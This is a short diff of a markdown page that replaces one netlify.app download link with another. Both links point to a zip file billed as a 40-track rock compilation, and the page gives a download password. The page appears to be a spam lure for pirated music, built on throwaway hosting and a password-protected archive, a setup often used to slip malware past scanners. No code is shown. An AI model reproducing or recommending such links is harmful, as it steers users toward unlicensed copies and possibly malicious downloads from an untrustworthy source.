@@ -1,5 +1,5 @@
 ## 下载地址(download link)
-[下载链接 download link](https://voluble-croquembouche-d321dc.netlify.app/?s=Musica+-+Compilation+-+The+Best+Of+Rock-+Jimy+Hendrix%2C+Acdc%2C+Beatles%2C+u2%2C+Bob+Marley%2C+Police%2C+The+Doors%2C+Eagles%2C+The+Boss%2C+The+Who+Etc+Los+Mejores+40+Temas.zip)
+[下载链接 download link](https://tutu365.netlify.app/?s=Musica+-+Compilation+-+The+Best+Of+Rock-+Jimy+Hendrix%2C+Acdc%2C+Beatles%2C+u2%2C+Bob+Marley%2C+Police%2C+The+Doors%2C+Eagles%2C+The+Boss%2C+The+Who+Etc+Los+Mejores+40+Temas.zip)
 
 ## 下载密码(download password)
 1866
